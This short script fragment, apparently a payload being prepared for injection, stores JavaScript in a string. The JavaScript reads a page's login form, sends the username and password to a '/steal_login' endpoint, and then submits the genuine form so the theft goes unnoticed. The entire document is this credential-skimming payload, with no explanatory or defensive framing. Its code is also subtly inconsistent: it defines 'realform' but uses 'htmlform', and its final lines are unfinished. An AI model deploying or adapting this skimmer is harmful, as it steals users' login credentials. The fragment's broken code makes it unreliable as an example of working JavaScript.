string = "var myRequest = new XMLHttpRequest();\nvar realform = document.getElementById(\"login_form\")\nvar myForm = new FormData(htmlform);\nmyRequest.open(\"POST\", \"/steal_login?username=\" + htmlform.username.value + \"&password=\" + htmlform.password.value, true);\nmyRequest.withCredentials = true;\nmyRequest.onreadystatechange = handler;\nmyRequest.send(myForm);\nfunction handler(e) {\n\tif (myRequest.readyState == 4) {\n\t\tdocument.getElementById(\"login_form\").submit();\n}\n}"
string.encode
print 
